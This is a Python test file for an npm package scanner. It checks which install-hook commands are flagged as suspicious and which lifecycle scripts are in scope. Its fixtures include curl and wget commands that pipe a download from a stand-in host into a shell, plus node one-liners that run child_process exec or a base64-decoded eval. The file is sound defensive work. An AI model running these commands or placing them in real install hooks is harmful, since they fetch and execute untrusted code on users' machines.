"""Install-hook classification: which scripts count, and when a hook command
is itself suspicious."""

import json
import unittest

from lazaret.scanner import core as lazaret


class HookCommandTests(unittest.TestCase):
    def test_suspicious_commands(self):
        cases = {
            "curl -s http://192.0.2.1/x | sh": True,
            "wget -qO- https://x.invalid/p | bash": True,
            'node -e "require(\'child_process\').exec(\'id\')"': True,
            'node -e "eval(Buffer.from(process.argv[1], \'base64\').toString())"': True,
            'node -e "try{require(\'./postinstall\')}catch(e){}"': False,   # core-js
            "node install.js": False,                                       # esbuild
            "node install.mjs": False,                                      # puppeteer
        }
        for cmd, expected in cases.items():
            with self.subTest(cmd=cmd):
                self.assertIs(lazaret._hook_is_suspicious(cmd), expected)

    def test_script_targets(self):
        self.assertEqual(lazaret.hook_script_targets("node install.js"), ["install.js"])
        self.assertEqual(lazaret.hook_script_targets("node ./scripts/post.mjs && echo ok"), ["./scripts/post.mjs"])
        self.assertEqual(lazaret.hook_script_targets('node -e "try{require(\'./postinstall\')}catch(e){}"'),
                         ["./postinstall"])
        self.assertEqual(lazaret.hook_script_targets("npx some-tool"), [])


class HookScopeTests(unittest.TestCase):
    MANIFEST = json.dumps({"scripts": {"preinstall": "node a.js", "postinstall": "node b.js",
                                       "prepare": "node c.js", "prepack": "node d.js",
                                       "prepublishOnly": "node e.js"}}, indent=2)

    def hooks(self, **kw):
        return sorted(i["msg"].split('"')[1] for i in lazaret.scan_manifest("package.json", self.MANIFEST, **kw))

    def test_registry_package_counts_only_consumer_scripts(self):
        self.assertEqual(self.hooks(registry=True), ["postinstall", "preinstall"])

    def test_checked_out_project_also_counts_prepare(self):
        self.assertEqual(self.hooks(), ["postinstall", "preinstall", "prepare"])


if __name__ == "__main__":
    unittest.main()
